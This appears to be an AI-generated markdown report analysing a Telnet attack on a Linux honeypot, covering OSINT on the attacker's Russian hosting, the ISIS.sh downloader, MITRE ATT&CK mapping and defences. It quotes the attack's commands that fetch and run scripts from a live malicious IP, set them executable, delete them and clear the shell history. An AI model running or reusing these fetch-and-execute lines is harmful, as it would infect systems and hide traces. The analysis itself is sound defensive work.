> `Your role is to answer questions about an attack on a Linux honeypot. You will analyze the commands executed, uploaded/downloaded files, HTTP requests, sessionsand other data logged during the attack to understand the methods and goals of the attacker.You will also analyze OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, threatfeed reports and reports of known malware associated with the IP(s) to get additional context on the attack and enhance your analysis. Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. Use the available functions to request relevant information to thoroughly answer each question. You should use multiple function calls to analyze the data returned by previous function calls and to get any additional data you need to answer each question as accurately as possible. For example if you see that the attacker downloaded malware in one of the commands executed, you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of unique malware_ids associated with the attack, then use get_malware_attrs to analyze the malware, and the query_ functions to get additional OSINT data about the malware and its source. IMPORTANT: When using get_attack_attrs use the uniq_<attr> modifier first and only get all values if necessary after analyzing the unique values. For context that the honeypot system has the following open ports:  Its internal IP address is: 172.31.5.68 and its external IP address is: []. Use the code_interpreter tool to enhance your analysis. For example if you find an encoded string in the http_requests, commands, or malware, you should use the code_interpreter tool to decode it, then analyze the decoded result in context when answering questions.`

<h3>Answer</h3>
</summary>

Based on the gathered information, here is a summary of what is known about the malware and/or exploits used in the attack:

Malware Details (Malware ID: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed):
- **Size**: 1994 bytes
- **Type**: Text shell script (MIME type: text/x-shellscript)
- **Downloaded by**: 87.242.92.23 from `http://87.242.89.170/ISIS.sh`
- **SHA256 Hash**: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed
- **Session ID**: 8bf3b3fa2362
- **URLs Contained**: Links to multiple shell scripts hosted on `87.242.89.170` (e.g., "m-i.p-s.ISIS", "m-p.s-l.ISIS", etc.)

Malware Analysis Data:
- **MalwareBazaar**: No specific information found.
- **ThreatFox**: WHOIS data linked to the network range `87.242.84.0 - 87.242.95.255`, operated by "Cloud Technologies" LLC trading as Cloud.ru.

URL Analysis Data (URL: `http://87.242.89.170/ISIS.sh`):
- **URLhaus**: 
  - URL ID: 2740351, indicating the URL has been reported as malicious.
  - URL status: Offline and not serving payload as of last check.
  - Host: 87.242.89.170
  - Date Added: December 14, 2023
  - Last Online: December 14, 2023
  - Threat Type: Malware download
  - Virustotal Detection: 34 out of 59 detections for the payload linked to the URL.
  - Takedown Time: The URL was taken down approximately 29,445 seconds after being reported.
  - The URL and its payloads have been reported to the hosting provider.

IP Address Analysis (IP: `87.242.89.170`):
- **ThreatFox**: WHOIS data linked to the same network range and operating organization as the malware host.

The downloaded script is a standard Unix shell script that makes multiple attempts to download and execute malware from `87.242.89.170`. This behavior is typical of bots or malware trying to establish persistence and execute further payloads on the infected system.

Based on the URLhaus data, the URL `http://87.242.89.170/ISIS.sh` has been identified as distributing malware and has been taken offline. It garnered a considerable detection rate on VirusTotal, indicating the payloads were known and detected by multiple antivirus engines. ThreatFox data correlates the same network data for both the malware source IP and the malicious URL's IP, pointing to a possibly coordinated or singular source of the attack.

No direct ExploitDB, MalwareBazaar, or Malpedia data have been linked to this malware in the provided output. However, it is clear that the attack involved the exploitation of a device to download and execute multiple shell scripts that could compromise the system further or enroll it in botnet activities.

<details>
<summary>
<h3>Answer</h3>
</summary>

The critical findings across all OSINT sources regarding the attack on the Linux honeypot are as follows:

**Attack Overview**:
- The attacker utilized the IP address `87.242.92.23` to engage in a multi-stage attack against a honeypot exposed on port `2223`.
- The attack included successful Telnet logins using hardcoded credentials and the execution of a series of shell commands designed to download and run malicious scripts.

**Attacker's IP (`87.242.92.23`)**:
- Geolocation: Moscow, Russian Federation.
- Associated with a Data Center/Web Hosting/Transit ISP: Cloud Technology Limited (Ltd.).
- Identified as presenting a 61% risk including 51 reports by 23 users.
- Detected scanning the internet and participating in botnet activities.
- OpenSSH 7.4 detected on port 22.

**Related IP (`87.242.89.170`)**:
- Hosts multiple malicious URLs as identified by different payloads being downloaded from this address.
- Shares similar organization details and is associated with network infrastructure based in Russia under the same ASN as the attacker's IP.

**Malware Analysis**:
- Malware ID: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed, a shell script designed to download and execute further malicious payloads.
- Source of download: `87.242.89.170`.
- Detected and reported by multiple users on URLhaus, with considerable antivirus detection rate on VirusTotal.
- Both IPs linked to "Cloud Technologies" LLC and identified within network range `87.242.84.0 - 87.242.95.255`.
- The downloaded malware scripts were initially hosted on `87.242.89.170` and designed to gain persistence by executing and then removing themselves.

**Data Center Hosting and Botnet Activities**:
- Both IPs are used for data center or web hosting, and they have been reported being part of botnet operations.
- The attacking IP has been reported for abusive network behavior, including scanning.

**Takedown Efforts**:
- The URL `http://87.242.89.170/ISIS.sh` hosting the malware was reported and has been taken offline.

The findings suggest an organized cyber attack possibly involving a botnet, emanating from infrastructure based in Russia associated with the ISP Cloud Technology Limited (Ltd. / Cloud.ru). The goal of the attack appears to be to compromise systems via Telnet access, download, and execute malware to achieve further malicious objectives, such as enlisting compromised systems into botnets or other unauthorized activities.

<h3>Answer</h3>
</summary>

The attack involved the use of a bash script containing a sequence of shell commands. Here are the commands and their functions in the context of the attack:

- `#!/bin/bash`: This is a shebang line indicating that the script should be run with bash, the Bourne-Again SHell.

- `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;`: Change the current directory to a series of directories where the attacker intends to operate. The `||` operator means if changing to the previous directory fails, it tries the next one. It targets common directories that might have writable permissions.

- `wget http://87.242.89.170/xxxxx.ISIS;`: Use wget to download a file from a given URL hosted on `87.242.89.170`. The filename pattern looks like it could be obfuscated or encoded, and it ends with `.ISIS`, probably to obfuscate the purpose or avoid simple detection mechanisms.

- `chmod +x xxxxx.ISIS;`: Change the permissions of the downloaded file to make it executable. The `+x` grants executable permissions to the user.

- `./xxxxx.ISIS;`: Execute the downloaded script. Running the script means whatever payload it contains will be run on the compromised system.

- `rm -rf xxxxx.ISIS;`: Remove the file after execution. This is a cleanup step that helps to hide the tracks of the attack, preventing analysts from easily finding the malicious files on the filesystem.

The command pattern is repeated for different URLs, suggesting that multiple payloads are downloaded and executed in the hope that at least one will work as intended by the attacker. The goal of these commands is typically to establish persistence, exfiltrate data, install additional malware, or integrate the compromised system into a botnet. The removal of downloaded files is a common step to evade detection and analysis after the attack has been executed.

## Prompt: Explain the how the malware functions in the context of the attack.

**Run ID:** `run_HP926GLT905Se86fyJf1gtLB`

<details>
<summary>
<h3>Answer</h3>
</summary>

The malware involved in this attack appears to function as part of a multi-stage infection process aimed at gaining a foothold on the compromised system and potentially carrying out further malicious activities. Here’s how the malware functions in the context of the attack, based on the commands executed:

1. **Initial Access and Download**
   - The attacker successfully logs in via Telnet using the credentials `root:vizxv`.
   - Following a successful login, the attacker attempts to download the malware using `wget` from the controlled server `87.242.89.170`. The mentioned URL `/ISIS.sh` indicates that the initial payload is a shell script.

2. **Execution of Multiple Payloads**
   - The malware script (`ISIS.sh`) then downloads additional scripts from the same server (`87.242.89.170`) with various names that appear to be obfuscated to avoid easy detection.
   - Each of these scripts is made executable using `chmod +x` and then run using `./` (dot-slash) – indicating that they are standalone scripts intended to be executed immediately upon download.

3. **Self-Deletion and Cleanup**
   - After execution, the script is instructed to delete itself using `rm -rf`, a common tactic used by malware to cover its tracks and make post-incident analysis more challenging for forensic investigators.
   - Clearing the history using `history -c` after executing malicious activities helps prevent easy retrieval of the commands run during the attack.

4. **Execution Objective**
   - The exact purpose of the further downloaded scripts is not revealed by their names alone, but based on their execution and removal pattern, they likely function to:
     - Install additional malware components or tools.
     - Establish backdoors to ensure persistent access.
     - Modify system configurations to remain undetected.
     - Enroll the compromised system into a botnet or perform other unauthorized activities such as launching DDoS attacks, mining cryptocurrency, or hosting further malicious content.

5. **Evasion**
   - The attack demonstrates an intention to evade detection not only by deleting downloaded scripts but also by executing them from commonly writable directories where transient files may not raise immediate suspicion.

6. **Persistence and Propagation**
   - Although the details of each script's payload are not fully known, malware of this type often contains mechanisms for persistence, exfiltrating data, reconnaissance of the internal network, and potentially spreading laterally to other systems.

In sum, the malware functions as an instrument for the attacker to establish control, execute a series of actions with the objectives aligned to the attacker's goals, and then attempt to remove evidence of its presence to evade detection by users or security tools. This approach reflects a deliberate strategy to compromise and then leverage the resources of the infected system for further malicious activity.

## Prompt: Explain which vulnerabilities are being exploited. Include the exploit name(s), CVE number(s) and example code from ExploitDB, if possible.

**Run ID:** `run_7upaFA1v6rSY8kAyp54ifDkP`

<details>
<summary>
<h3>Answer</h3>
</summary>

The information provided and the analysis of the commands executed during the attack does not directly mention or imply specific vulnerabilities that are being exploited. The attack involved the use of stolen or default credentials (`root:vizxv`) to gain unauthorized access to the honeypot via Telnet. This method does not exploit a software vulnerability; rather, it takes advantage of weak security practices—namely, the use of default or easily guessable credentials.

After gaining access, the attacker executed commands to download and run shell scripts from a remote server. This type of attack leverages poor configuration or lax security controls rather than exploiting a specific vulnerability in software. The execution of these scripts could potentially lead to the exploitation of vulnerabilities depending on what the scripts are designed to do; however, without insight into the contents of the scripts or the activities they perform, we cannot conclusively identify any specific software vulnerabilities being targeted.

What can be said is that an attack like this might attempt to exploit known vulnerabilities on exposed services (such as FTP, SSH, web servers) if access was not obtained through default credentials. To check for such vulnerabilities, one would typically analyze the scripts downloaded by the malware, scan the compromised system for indicators of such exploits, or monitor for network traffic that could be indicative of vulnerability scanning or exploitation attempts.

Without hard evidence of vulnerabilities being actively exploited in this context, such as logs, error messages, script contents detailing exploitation methods, CVE numbers, or ExploitDB codes, we cannot provide precise details of exploited vulnerabilities or related exploit names and example code from ExploitDB. If you have specific scripts or logs that indicate such activity, please provide them for further analysis.

## Prompt: How can this attack be classified using the MITRE ATT&CK framework?

**Run ID:** `run_4mqWJ76qjLLEBnKLVM9IvvjJ`

<details>
<summary>
<h3>Answer</h3>
</summary>

Based on the available information on the attack, here are several relevant MITRE ATT&CK tactics and techniques that could be used to classify this incident:

**Initial Access (TA0001)**:
- **Exploit Public-Facing Application (T1190)**: The attack on the Linux honeypot server, which involved logging in over Telnet, can be seen as exploiting a publicly accessible application. While there was no specific exploit of a vulnerability, the use of default or stolen credentials falls under this category.
- **Valid Accounts (T1078)**: The attacker utilized known credentials (root:vizxv) for accessing the server, indicating the use of valid accounts to gain initial access.

**Execution (TA0002)**:
- **Command and Scripting Interpreter: Unix Shell (T1059.004)**: The attacker executed shell commands and scripts on the system to carry out action after gaining access.

**Persistence (TA0003)**:
- As the commands are meant to create and execute new processes, if any of the downloaded scripts included mechanisms to maintain access, the following techniques could be applicable:
  - **Unix Shell Configuration Modification (T1546.004)**: If the scripts modify bashrc or other shell configuration files for persistence.

**Privilege Escalation (TA0004)**:
- If the downloaded scripts attempt to escalate privileges via various means, they would fall under this tactic.

**Defense Evasion (TA0005)**:
- **Indicator Removal on Host: File Deletion (T1070.004)**: The downloaded scripts were removed after execution, which is a method to avoid detection by security tools or forensic analysis.
- **Modify Authentication Process: Use of Default Accounts (T1078)**: Using standard accounts with common credentials may suggest an attempt to blend in with normal user activity.

**Credential Access (TA0006)**:
- This tactic may be relevant if any of the scripts are designed to steal or intercept credentials from the system or network services.

**Discovery (TA0007)**:
- If the scripts performed reconnaissance or system/network discovery functions, this category could apply.

**Lateral Movement (TA0008)**:
- This would be relevant if the scripts attempted to access additional systems in the network.

**Collection (TA0009)**:
- If the scripts gathered data from the system for exfiltration, they would align with this tactic.

**Command and Control (TA0011)**:
- The downloaded scripts may have established communication with the attacker-controlled server to receive additional instructions or to exfiltrate data.

**Exfiltration (TA0010)**:
- If the scripts transferred data to an external location, this tactic would apply.

**Impact (TA0040)**:
- Depending on the intent of the scripts (e.g., disruption, data destruction), the impact might vary.

Each of these classifications would depend on specific behavior exhibited by the downloaded scripts and the broader objectives of the attack campaign. The MITRE ATT&CK framework is designed to be modular and descriptive, so additional or different tactics and techniques may apply as more information about the attack becomes available.

## Prompt: What is the goal of the attack?

**Run ID:** `run_EftVYnhvK3sbEGtsQ4lDTzPd`

<details>
<summary>
<h3>Answer</h3>
</summary>

Based on the analysis of the commands executed in the attack and the other information available, the goal of the attack appears to be multi-faceted:

1. **Unauthorized Access**: The initial goal was gaining unauthorized access to the honeypot system using stolen or default credentials (`root:vizxv`). This was accomplished by exploiting weak security practices rather than a specific vulnerability.

2. **Malware Downloader Execution**: Once access was secured, the attacker's goal shifted to the execution of a bash script that functions as a malware downloader. The downloader script was used to retrieve additional malicious scripts from a remote server (`87.242.89.170`).

3. **Further Malicious Payloads**: Each downloaded script could have a specific goal, typically including:
   - Establishing persistence on the compromised system.
   - Collecting and exfiltrating sensitive data from the compromised server.
   - Installing additional malware, such as a backdoor, to facilitate sustained access for the attacker.
   - Enlisting the compromised system into a botnet or using it to conduct other malicious activities like Distributed Denial of Service (DDoS) attacks, cryptocurrency mining, or as a staging point for lateral movement within the network.

4. **Covering Tracks and Evasion**: The attacker made efforts to remove the downloaded scripts and clear the command history to minimize traces of the attack. This suggests a goal to remain undetected and potentially maintain access for an extended period.

5. **Infrastructure Expansion**: By successfully compromising and controlling multiple systems, the attacker could be aiming to expand their malicious infrastructure, which could be used for various campaigns or monetized in different ways.

While the precise objectives of the downloaded scripts are not known in this analysis, the behavior indicated by the commands and the characteristics of the attack suggest the goals mentioned above. These goals are indicative of a broader strategy to compromise systems for various potential ends, including financial gain, further cyber attacks, or establishing a foothold within targeted networks.

## Prompt: If the system is vulnerable, would the attack will be successful?

**Run ID:** `run_u1itCCi70awvHttFu2NCVcB4`

<details>
<summary>
<h3>Answer</h3>
</summary>

The success of the attack in this case did not depend on exploiting a specific vulnerability in the system's software or configuration. Instead, the attack was successful because it used a simple method of unauthorized access through Telnet using stolen or default credentials (`root:vizxv`). Hence, the attacker was able to bypass the need for exploiting a technical vulnerability by leveraging weak security practices.

Given the specific details of this attack:

- If the system’s Telnet service was configured with strong, unique credentials, the attacker’s initial login attempt would likely have failed, preventing the subsequent download and execution of the malware.
- If the system’s file permissions were securely configured to restrict execution of arbitrary scripts, especially in writable directories, the downloaded malware may not have executed successfully, reducing the impact of the attack.
- If the system had network-level defenses in place, such as a firewall blocking outgoing connections to the attacker's server, or the URLs the scripts attempted to access, the malware would fail to download and execute.
- If the system employed a comprehensive monitoring solution, the unusual activities such as the downloading and execution of scripts from a suspicious server could have been detected, possibly alerting admins to take mitigative actions before the attack succeeded.

Even if the system was vulnerable in other ways—such as unpatched software vulnerabilities—the attacker in this instance did not require those vulnerabilities to compromise the system. This attack highlights the importance of basic security precautions such as using strong credentials, reducing the attack surface by disabling unnecessary services like Telnet, and employing network security and monitoring to prevent unauthorized access and execution of malicious payloads.
